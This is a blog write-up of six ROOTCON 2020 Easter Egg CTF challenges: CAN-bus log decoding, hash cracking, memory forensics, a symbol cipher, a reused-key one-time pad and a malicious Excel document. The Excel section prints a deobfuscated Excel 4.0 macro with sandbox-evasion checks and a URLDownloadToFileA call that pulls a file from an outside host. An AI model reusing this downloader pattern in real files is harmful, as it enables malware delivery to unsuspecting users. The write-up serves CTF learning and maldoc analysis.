---
layout: single
title:  "ROOTCON Easter Egg 2020 Write-up"
excerpt: "Since I got a lot of free time (and heard about the big prize), I decided to participate in ROOTCON Easter Egg Hunt 2020, hosted by Pwn De Manila. Luckily, I finished second place on this event."
header:
  teaser: "/assets/images/ctf/rootcon_easter_egg_2020/site.png"
date: "2020-04-14"
classes: wide
categories:
- rootcon
- ctf
tags:
- candump
- memdump 
- maldoc
- OTP
---

![](/assets/images/ctf/rootcon_easter_egg_2020/site.png)  

Since I got a lot of free time (and heard about the big prize), I decided to participate in [ROOTCON](https://www.rootcon.org/) Easter Egg Hunt 2020, hosted by [Pwn De Manila](https://www.facebook.com/pwndemanila/). Luckily, I finished second place on this event.

![swag](https://media.giphy.com/media/62PP2yEIAZF6g/giphy.gif)

## List of easter egg challenges (arranged according to the order of completion)
- [Space](#space)   
- [Power](#power)   
- [Mind](#mind)   
- [Soul](#soul)  
- [Time](#time)   
- [Reality](#reality)  

## Space  

This challenge provides us a CANBUS log file. This is a bit tricky since I am not familiar with this type of log. 

![](/assets/images/ctf/rootcon_easter_egg_2020/space1.png)   

A quick search for "vcan0 canbus" led me into this write-up - [Car Hacking 101: Practical Guide to Exploiting CAN-Bus using Instrument Cluster Simulator — Part II: Exploitation](https://medium.com/@yogeshojha/car-hacking-101-practical-guide-to-exploiting-can-bus-using-instrument-cluster-simulator-part-ee998570758).  

According to the blog, the log file can be interpreted as:   

```
# timestamp interface id#data 
# (1586543188.428072) vcan0 300#FF  

Timestamp : 1586543188.428072  
Interface : vcan0  
ID        : 300  
Data (hex): FF  
```

A quick look at the log file tells us that the data is just repetitive. Out of curiosity, I sorted the log file and removed the redundant data.

![](/assets/images/ctf/rootcon_easter_egg_2020/space2.png)    
![](/assets/images/ctf/rootcon_easter_egg_2020/space3.png)    

After sorting the data, the following lines caught my eye.  

```  
123#DEAD1337  <- leetspeak  
123#DEADBEEF  <- leetspeak 0xdeadbeef debug value (pwn <3)  
...    
...    
...    
400#7370               <- ASCII in hex  
401#616365736174656C   <- ASCII in hex 
402#6C69746573686176   <- ASCII in hex   
403#6563616E746F6F     <- ASCII in hex   
```

Converting the hex values of ID 400-403 to ASCII gives us the egg for the first challenge.

![](/assets/images/ctf/rootcon_easter_egg_2020/space4.png)    

Space egg: rc_easter{spacesatelliteshavecantoo}  

## Power  

This challenge provides us a tgz file that contains a note and an openssl encrypted data.  

![](/assets/images/ctf/rootcon_easter_egg_2020/power1.png)  

The note gives us the information we need to solve this challenge.  

![](/assets/images/ctf/rootcon_easter_egg_2020/power2.png)  

According to the given note, we need to guess the password of the encrypted file using the pattern ```(YEAR)-(NAME OF ROOTCON GOON)-(FAVORITE COLOR)```, and the hash of the password should be ```34d5cf6ecc220ab4c31d90f41f07c9a1```.   

Given this info, we need to create a wordlist that fits the pattern. To generate the wordlist, I used the following tools / resources:  

YEAR:  

```
$ crunch 4 4 0123456789
# Remove all numbers - 1799 < x < 2200 for smaller scope
```  

GOON:  
- [Meet the Goons](https://www.rootcon.org/html/about/goons)   

COLOR:  
- [List of colors: A–F](https://en.wikipedia.org/wiki/List_of_colors:_A%E2%80%93F)  
- [List of colors: G–M](https://en.wikipedia.org/wiki/List_of_colors:_G%E2%80%93M)  
- [List of colors: N–Z](https://en.wikipedia.org/wiki/List_of_colors:_N%E2%80%93Z)   

I also used this script to generate the pattern combination.   
```  
import itertools

year = [x.strip() for x in open('year.txt').readlines()]
goon = [x.strip() for x in open('goonz.txt').readlines()]
colors = [x.strip() for x in open('colors.txt').readlines()]

pw = [year, goon, colors]
pws = ['-'.join(x) for x in list(itertools.product(*pw))]

for x in pws:
    print x
```   

After creating the wordlist, the next thing to do is to crack the given hash using the wordlist.  

![](/assets/images/ctf/rootcon_easter_egg_2020/power3.png)   

Use the cracked password to decrypt the ```openssl encrypted file```.  

![](/assets/images/ctf/rootcon_easter_egg_2020/power4.png)     

The decrypted data is a PNG file, which contains a QR code.

![](/assets/images/ctf/rootcon_easter_egg_2020/power5.png)   

Scanning this QR code gives us the egg.  

Power egg: rc_easter{p0w3r_1s_n07h1n6_w17h0u7_c0ntr0L}   

## Mind   

This challenge provides us three files, a memory dump, a note and a hint.  

![](/assets/images/ctf/rootcon_easter_egg_2020/mind1.png)   

The note contains the information we need to solve the challenge.  

```
If you're reading this, I sacrificed my thoughts and memories to protect the‌‌‌‌‍‬‬‌ Mind Egg.

To protect you.

Doing so will make me forget you and every moment we had together.

But doing so also gives us more time to spend new memories once this is all over.


Love,

Victor

‌‌‌‌‍‍﻿﻿



















‌‌‌‌‍‬﻿‍





























‌‌‌‌‍﻿‬‍


































---------------------‌‌‌‌‍‍﻿﻿-------------------------------------------------------------------
Eggshield Agent,

If you're reading this‌‌‌‌‍‬﻿‌, the second part of the secret is in this file. Look closely and do it fast! Bonny Stark and the whole world is waiting.

The first one, well.. if you‌‌‌‌‌﻿‌‌'re really from Eggshield you should be able to figure it out. Let's go back in time :)

Once you ‌‌‌‌‍﻿‍‬have the secret, use that to open the deepest part of my memories. My treasures.

Lastly, please do tell the Avengersto take care of Wanda for me.

Till then,
Victor‌‌‌‌‌﻿‌﻿
```   

TLDR:  
- We need to find the secret (password) to unlock the treasure.  
- The first part of the secret is in the memory dump (Note: "Let's go back in time").    
- The second part of the secret is in the note.  
- The treasure is not given, we need to retrieve this from the memory dump.   

To retrieve the first part of the password, we can use [volatility](https://github.com/volatilityfoundation/volatility) to inspect the memory dump.  

![](/assets/images/ctf/rootcon_easter_egg_2020/mind2.png)   

A quick check provides us that it is a windows 7 memdump.  

Following the hint ```Let's go back in time``` tells me that I need to check something from the history. The first thing that popped into my head is to check the command line history.

![](/assets/images/ctf/rootcon_easter_egg_2020/mind3.png)   

The base64 string caught my eye on this one.  

```  
echo "MUlPdVg1dTsybDJldW9MPSg/SkJGIy11bURKc2AvQDdHMyU3ODczKEByMg=="  
```  

Decoding this base64 string leads us to a blackhole.   

![](/assets/images/ctf/rootcon_easter_egg_2020/mind4.png)   

I almost forgot checking the ```hint.txt``` file.  

```
def -> 58 -> 85 -> 64 -> ?  
```

The hint led me into using [cyberchef](https://gchq.github.io/CyberChef/) to decode the string.  

![](/assets/images/ctf/rootcon_easter_egg_2020/mind5.png)   

By reversing the steps from 64 (base64) to def (Raw Deflate), this recipe resulted into a good-looking output. (Note: Raw Inflate is the reverse of Raw Deflate)

Looks like ```sc4rl37_w1tc``` is the first part of the password.

Going back to the file ```To Wanda.txt```, it says that the second part of the password is already inside the file.

Opening this file in ```vim``` shows that there are unicode bytes embeded in this file.

![](/assets/images/ctf/rootcon_easter_egg_2020/mind6.png)   

These unicode characters are ```ZERO-WIDTH SPACE``` unicode characters, and is usually used as a steganography technique. This tool ([Unicode Steganography with Zero-Width Characters](https://330k.github.io/misc_tools/unicode_steganography.html)) can be used to extract the hidden message.  

![](/assets/images/ctf/rootcon_easter_egg_2020/mind7.png)    

The extracted string is ```h_l0v3```, and the password for Victor's treasures is ```sc4rl37_w1tch_l0v3```.   

Now, we need to extract the ```treasures``` from the memory dump.  


First, let's check if there is a file named ```treasure```.  

Executing ```filescan``` plugin + filtering out ```treasure``` gives us nothing. 

![](/assets/images/ctf/rootcon_easter_egg_2020/mind8.png)    

Let's try to look for strings related to ```treasure```. (Take note that the strings in windows memory dump is in little endian)   

![](/assets/images/ctf/rootcon_easter_egg_2020/mind9.png)    

The following output gave us the idea that ```my_treasures``` existed in the system. Since the file did not appear in the ```filescan```, it seems that the file was deleted.

![](/assets/images/ctf/rootcon_easter_egg_2020/mind10.png)    

Another lead tells us that the file might be uploaded to ```uploadfiles[.]io```. We can download the file via this URL - https://uploadfiles.io/kiyqnnt9.  

Using ```sc4rl37_w1tch_l0v3``` as the password did not extract the contents of the treasure. I was stuck on this part since I am quite sure that the secret password should work.  

![](/assets/images/ctf/rootcon_easter_egg_2020/mind11.png)    

I took a stepback and tried to find the correct password on the memory dump using keywords from ```To Wanda.txt```.  

![](/assets/images/ctf/rootcon_easter_egg_2020/mind12.png)    

Got a familiar string, ```h_my_l0v3``` (almost similar to ```h_l0v3```), tried the new password - ```sc4rl37_w1tch_my_l0v3```, and was able to open the archive.

![](/assets/images/ctf/rootcon_easter_egg_2020/mind13.png)      

The extracted folder contains 748 files.  

![](/assets/images/ctf/rootcon_easter_egg_2020/mind14.png)    

Upon inspecting, I saw a odd-looking file with a different file name length.  

![](/assets/images/ctf/rootcon_easter_egg_2020/mind15.png)      

This odd-length file contains a QR code which contains the egg for this challenge.   

![](/assets/images/ctf/rootcon_easter_egg_2020/mind_egg.jpg)    

Mind egg: rc_easter{y0u_c0uld_n3veR_huRt_m3_I_ju57_f33l_y0u}  


**Note: The issue I encountered while extracting the second part of the password is when I tried to copy the contents of the file from the terminal. Some unicode bytes are being truncated by the terminal. Learned this when I shared my solution to the challenge creator.**
 
## Soul   

This challenge provides us this image.    

![](/assets/images/ctf/rootcon_easter_egg_2020/soul.jpg)   

This obviously looks like a cipher that uses symbols. While searching for ```symbol ciphers```, I stumbled upon ```Atlantean alphabet```.  

![](/assets/images/ctf/rootcon_easter_egg_2020/atlantean.png)  

The alphabet above translates the given image to ```sacr1f1c3h4lft0me```.   

Soul egg: rc_easter{sacr1f1c3h4lft0me}  

## Time   

This challenge provides us the following notes:  

![](/assets/images/ctf/rootcon_easter_egg_2020/time1.png)  

```
I think someone stole the eggs here.
They were pretty messy. Leaving these crumbs everywhere.
I gathered them for you to compare adventurer. Go forth. Hydaelyn awaits for you valiant success
in uncovering the secrets of these "eggs" that have spawned on the Second Umbral Moon of our time.


Urianger's Notes:

These cryptic messages seem to have some similarities. Perhaps the same key was used?
Although it is naught but a guess of mine, pray do help in figuring it out.  

Message 1: 83d7f7966225c71b556cfd1fa28aa1cb364903c74bfad82400a5b8326ebf110cf610Q  
Message 2: 8380cb903366dd4b7822ba48a9dacf8b6b4b6aa81df1f14b46afd4736ae9111ee2  
```  

Based on the given notes, it seems that the usage of the same key on both ciphertexts can be exploited. 

According to this blog - [Many Time Pad Attack - Crib Drag](http://travisdazell.blogspot.com/2012/11/many-time-pad-attack-crib-drag.html), crib dragging attack can be used to uncover two ciphertexts that have been encrypted with the same key. But our problem is we need to guess a part of the secret key.

We can use this [website](https://toolbox.lotusfa.com/crib_drag/) as our tool.

![](/assets/images/ctf/rootcon_easter_egg_2020/time2.png)  

Since we already know the flag format, we can test if it can be used as a key.  

![](/assets/images/ctf/rootcon_easter_egg_2020/time3.png)  

It looks like we got it right. We got ```r4cc00n5_``` as an output. 

Now, we can use this string as our starting point to get the flag.  

After numerous attempts (of [Felix](https://seymour.hackstreetboys.ph/chals/ctf/2020_ROOTCONEasterEggHunt/Time.html) - shoutout to my teammate for solving this one :) ) of guesswork, we got the whole key.

![](/assets/images/ctf/rootcon_easter_egg_2020/time4.png)  

Time egg: rc_easter{3ggc1t1n6_0TP_3x3rc1535}

## Reality   

This challenge provides us two files, a README file and a spreadsheet.  

The README file gives us the instructions for this challenge.  

```  
Challenge Description:

	You must obtain the hidden secrets in order to see the reality.
```  

Upon inspecting the document using [vmonkey](https://github.com/decalage2/ViperMonkey), it seems that the behavior of the document is similar to these reports: 
- https://www.trendmicro.com/vinfo/ph/security/news/cybercrime-and-digital-threats/analysis-suspicious-very-hidden-formula-on-excel-4-0-macro-sheet
- https://blog.intel471.com/2020/03/25/analysis-of-an-attempted-attack-against-intel-471/

![](/assets/images/ctf/rootcon_easter_egg_2020/reality1.png)  

The document hides the sheet that contains the malicious macro.  

![](/assets/images/ctf/rootcon_easter_egg_2020/reality2.png)  

Upon inspecting, sheet #2 contains suspicious macros.  

![](/assets/images/ctf/rootcon_easter_egg_2020/reality3.png)  

Rewriting all characters gives the following commands:  

```
=ALERT("The workbook cannot be opened or repaired by Microsoft Excel because it's corrupt.",2)  
=IF(GET.WORKSPACE(13)<770, CLOSE(FALSE),)  
=IF(GET.WORKSPACE(14)<381, CLOSE(FALSE),)  
=IF(GET.WORKSPACE(19),,CLOSE(FALSE))  
=IF(GET.WORKSPACE(42),,CLOSE(FALSE))  
=IF(ISNUMBER(SEARCH("Windows",GET.WORKSPACE(1))), ,CLOSE(FALSE))  
=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://easteregg.rootcon.net/AZfzv7ckfbxj2Q6X/GC3Z543PZQL2buV6","c:\Users\Public\flag.txt",0,0)
=CLOSE(FALSE)  
```

The 7th instruction shows that it downloads the flag from this URL (http://easteregg.rootcon.net/AZfzv7ckfbxj2Q6X/GC3Z543PZQL2buV6), but downloading this file just gives this fake flag.  

![](/assets/images/ctf/rootcon_easter_egg_2020/reality4.jpg)  

Backtracking to the sheet, it seems that there is a hidden column (between C13 & C15). 

![](/assets/images/ctf/rootcon_easter_egg_2020/reality5.png)  

Converting these values to ASCII results to this.  

```
=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://easteregg.rootcon.net/sFpWgx9WkHQQ542K/36xQCWUDNaJpdbTB","c:\\Users\\Public\\flag.txt",0,0)
```

Downloading this URL (http://easteregg.rootcon.net/sFpWgx9WkHQQ542K/36xQCWUDNaJpdbTB) gives us the egg for this challenge.  

Reality egg: rc_easter{r34l1ty_15_0ft3n__d1s4pp01nt1ng}


